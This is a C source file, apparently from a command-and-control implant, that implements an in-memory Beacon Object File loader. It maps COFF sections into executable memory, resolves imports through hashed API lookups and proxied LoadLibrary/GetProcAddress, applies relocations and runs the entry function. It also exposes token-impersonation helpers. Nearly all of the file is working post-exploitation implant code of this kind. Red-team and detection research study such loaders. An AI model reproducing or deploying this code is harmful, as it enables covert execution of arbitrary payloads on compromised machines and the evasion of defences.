#include "Boffer.h"
#include "ProcLoader.h"
#include "utils.h"

#if defined(__x86_64__) || defined(_WIN64)
int IMP_LENGTH = 6;
#else
int IMP_LENGTH = 7;
#endif

void InitBofOutputData()
{
	if (bofOutputPacker == NULL) {
		bofOutputPacker = (Packer*)MemAllocLocal(sizeof(Packer));
		*bofOutputPacker = Packer();
	}
}

#define BEACON_FUNCTIONS_COUNT 23

BOF_API BeaconFunctions[BEACON_FUNCTIONS_COUNT] = {

	/// 5 - Data Parser API

	{ HASH_FUNC_BEACONDATAPARSE,              BeaconDataParse },
	{ HASH_FUNC_BEACONDATAINT,                BeaconDataInt },
	{ HASH_FUNC_BEACONDATASHORT,              BeaconDataShort },
	{ HASH_FUNC_BEACONDATALENGTH,             BeaconDataLength },
	{ HASH_FUNC_BEACONDATAEXTRACT,            BeaconDataExtract },

	/// 2 - Output API

	{ HASH_FUNC_BEACONOUTPUT,                 BeaconOutput },
	{ HASH_FUNC_BEACONPRINTF,                 BeaconPrintf },

	/// 7 - Format API

	{ HASH_FUNC_BEACONFORMATALLOC,            BeaconFormatAlloc },
	{ HASH_FUNC_BEACONFORMATRESET,            BeaconFormatReset },
	{ HASH_FUNC_BEACONFORMATAPPEND,           BeaconFormatAppend },
	{ HASH_FUNC_BEACONFORMATPRINTF,           BeaconFormatPrintf },
	{ HASH_FUNC_BEACONFORMATTOSTRING,         BeaconFormatToString },
	{ HASH_FUNC_BEACONFORMATFREE,             BeaconFormatFree },
	{ HASH_FUNC_BEACONFORMATINT,              BeaconFormatInt },

	/// 3 - Internal APIs

	{ HASH_FUNC_BEACONUSETOKEN,               BeaconUseToken },
	{ HASH_FUNC_BEACONREVERTTOKEN,            BeaconRevertToken },
	{ HASH_FUNC_BEACONISADMIN,                BeaconIsAdmin },
	//{ HASH_FUNC_BEACONGETSPAWNTO,             BeaconGetSpawnTo },
	//{ HASH_FUNC_BEACONSPAWNTEMPORARYPROCESS,  BeaconSpawnTemporaryProcess },
	//{ HASH_FUNC_BEACONINJECTPROCESS,          BeaconInjectProcess },
	//{ HASH_FUNC_BEACONINJECTTEMPORARYPROCESS, BeaconInjectTemporaryProcess },
	//{ HASH_FUNC_BEACONCLEANUPPROCESS,         BeaconCleanupProcess },
	{ HASH_FUNC_TOWIDECHAR,					  toWideChar },
	//{ HASH_FUNC_BEACONINFORMATION,            BeaconInformation },
	//{ HASH_FUNC_BEACONADDVALUE,               BeaconAddValue },
	//{ HASH_FUNC_BEACONGETVALUE,               BeaconGetValue },
	//{ HASH_FUNC_BEACONREMOVEVALUE,            BeaconRemoveValue },

	/// 5 - Other APIs

	{ HASH_FUNC_LOADLIBRARYA,                 proxy_LoadLibraryA },
	{ HASH_FUNC_GETMODULEHANDLEA,             proxy_GetModuleHandleA },
	{ HASH_FUNC_FREELIBRARY,                  proxy_FreeLibrary },
	{ HASH_FUNC_GETPROCADDRESS,				  proxy_GetProcAddress },
	{ HASH_FUNC___C_SPECIFIC_HANDLER,         NULL },
};

void* FindProcBySymbol(char* symbol)
{
	if ( StrLenA(symbol) > IMP_LENGTH) {
		ULONG funcHash = Djb2A((PUCHAR) symbol + IMP_LENGTH);
		for (int i = 0; i < BEACON_FUNCTIONS_COUNT; i++) { // BeaconFunctionsCount
			if (funcHash == BeaconFunctions[i].hash) {
				if ( BeaconFunctions[i].proc != NULL ) 
					return BeaconFunctions[i].proc;
			}
		}

		char symbolCopy[1024] = { 0 };
		memcpy(symbolCopy, symbol, StrLenA(symbol));

		CHAR c1[] = { '$',0 };
		CHAR c2[] = { '@',0 };

		char* moduleName = symbolCopy + IMP_LENGTH;
		moduleName = StrTokA(moduleName, c1);

		char* funcName = StrTokA(NULL, c1);
		funcName = StrTokA(funcName, c2);

		funcHash = Djb2A((PUCHAR)funcName);
		HMODULE hModule = ApiWin->LoadLibraryA(moduleName);
		
		memset(symbolCopy, 0, StrLenA(symbol));

		if (hModule) 
			return GetSymbolAddress(hModule, funcHash);
	}

	return NULL;
}

char* PrepareEntryName(char* targetFuncName)
{
#if defined(__x86_64__) || defined(_WIN64)
	return targetFuncName;
#else
	int targetLength = StrLenA(targetFuncName);
	char* entryName = (char*)MemAllocLocal(targetLength + 2);
	if (!entryName)
		return NULL;

	entryName[0] = '_';
	memcpy(entryName + 1, targetFuncName, targetLength + 1);
	return entryName;
#endif
}

void FreeFunctionName(char* targetFuncName)
{
#if !defined(__x86_64__) && !defined(_WIN64)
	MemFreeLocal((LPVOID*) & targetFuncName, StrLenA(targetFuncName));
#endif
}

bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections)
{
	for (int i = 0; i < pHeader->NumberOfSections; i++) {
		COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * i));
		mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, pSection->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
		if (!mapSections[i] && pSection->SizeOfRawData)
			return FALSE;
		memcpy(mapSections[i], coffFile + pSection->PointerToRawData, pSection->SizeOfRawData);
	}
	return TRUE;
}

void CleanupSections(PCHAR* mapSections, int maxSections)
{
	for (int i = 0; i < maxSections; i++) {
		if (mapSections[i]) {
			ApiWin->VirtualFree(mapSections[i], 0, MEM_RELEASE);
		}
	}
}

bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections, COF_SYMBOL* pSymbolTable, char* mapFunctions) {
	bool status = TRUE;
	int mapFunctionsSize = 0;

	for (int sectionIndex = 0; sectionIndex < pHeader->NumberOfSections; sectionIndex++) {
		COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * sectionIndex));
		COF_RELOCATION* pRelocTable = (COF_RELOCATION*)(coffFile + pSection->PointerToRelocations);

		for (int relocIndex = 0; relocIndex < pSection->NumberOfRelocations; relocIndex++) {
			COF_SYMBOL pSymbol = pSymbolTable[pRelocTable->SymbolTableIndex];
			if (pRelocTable->SymbolTableIndex >= pHeader->NumberOfSymbols) {
				BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
				return FALSE;
			}

			int offset = 0;
#ifdef _WIN64
			unsigned long long bigOffset = 0;
#endif

			if (pSymbol.Name.cName[0] != 0) { // Internal Symbol
				int sectionNumber = pSymbol.SectionNumber - 1;
				if (sectionNumber < 0 || sectionNumber >= pHeader->NumberOfSections) {
					BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
					return FALSE;
				}

#ifdef _WIN64
				if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR64) {
					memcpy(&bigOffset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(unsigned long long));
					bigOffset += (unsigned long long)mapSections[sectionNumber];
					memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &bigOffset, sizeof(unsigned long long));
				}
				else if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR32NB || pRelocTable->Type == IMAGE_REL_AMD64_REL32) {
					memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
					offset += (int)(mapSections[sectionNumber] - (mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4));
					memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
				}
#else
				memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
				offset += (unsigned int)(mapSections[pSymbolTable[pRelocTable->SymbolTableIndex].SectionNumber - 1]);
				memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(unsigned int));
#endif
			}
			else { // External Symbol
				unsigned int symOffset = pSymbol.Name.dwName[1];
				char* procSymbol = ((char*)(pSymbolTable + pHeader->NumberOfSymbols)) + symOffset;
				void* procAddress = FindProcBySymbol(procSymbol);
				if (!procAddress) {
					BeaconOutput(BOF_ERROR_SYMBOL, procSymbol, StrLenA(procSymbol));
					status = FALSE;
				}
#ifdef _WIN64
				if (pRelocTable->Type == IMAGE_REL_AMD64_REL32) {
					if (((char*)(mapFunctions + mapFunctionsSize * 8) - (mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4)) > 0xffffffff) {
						return FALSE;
					}
					memcpy(mapFunctions + mapFunctionsSize * 8, &procAddress, sizeof(unsigned long long));
					offset = (int)((mapFunctions + mapFunctionsSize * 8) - (mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4));
					memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
					mapFunctionsSize++;

					if (mapFunctionsSize * 8 >= MAP_FUNCTIONS_SIZE) {
						BeaconOutput(BOF_ERROR_MAX_FUNCS, procSymbol, StrLenA(procSymbol));
						return FALSE;
					}
				}
#else
				memcpy(mapFunctions + mapFunctionsSize * 4, &procAddress, sizeof(int));
				offset = (int)(mapFunctions + mapFunctionsSize * 4);
				memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
				mapFunctionsSize++;

				if (mapFunctionsSize * 4 >= MAP_FUNCTIONS_SIZE) {
					BeaconOutput(BOF_ERROR_MAX_FUNCS, procSymbol, StrLenA(procSymbol));
					return FALSE;
				}
#endif
			}

			pRelocTable = (COF_RELOCATION*)((char*)pRelocTable + sizeof(COF_RELOCATION));
		}
	}
	return status;
}

void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections)
{
	for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
		if (StrCmpA(pSymbolTable[i].Name.cName, entryFuncName) == 0) {
			void(*proc)(char*, unsigned long) = (void(*)(char*, unsigned long)) (mapSections[pSymbolTable[i].SectionNumber - 1] + pSymbolTable[i].Value);
			proc((char*)args, argsSize);
			return;
		}
	}
	BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
}

Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFile, unsigned int cofFileSize, unsigned char* args, int argsSize)
{
	COF_HEADER* pHeader      = NULL;
	COF_SYMBOL* pSymbolTable = NULL;
	PCHAR entryFuncName      = NULL;
	PCHAR mapFunctions       = NULL;
	BOOL  result			 = FALSE;
	PCHAR mapSections[MAX_SECTIONS] = { 0 };

	InitBofOutputData();
	bofTaskId = taskId;

	if (!coffFile || !targetFuncName) {
		goto RET;
	}

	pHeader = (COF_HEADER*)coffFile;
	pSymbolTable = (COF_SYMBOL*)(coffFile + pHeader->PointerToSymbolTable);

	entryFuncName = PrepareEntryName(targetFuncName);
	if (!entryFuncName) {
		BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
		goto RET;
	}

	result = AllocateSections(coffFile, pHeader, mapSections);
	if (!result) {
		BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
		goto RET;
	}

	mapFunctions = (char*) ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	if (!mapFunctions) {
		BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
		goto RET;
	}

	result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable, mapFunctions);
	if (!result) {

		goto RET;
	}

	ExecuteProc(entryFuncName, args, argsSize, pSymbolTable, pHeader, mapSections);

RET:
	if(mapFunctions)
		ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);

	FreeFunctionName(entryFuncName);
	CleanupSections(mapSections, MAX_SECTIONS);
	
	bofTaskId = 0;

	return bofOutputPacker;
}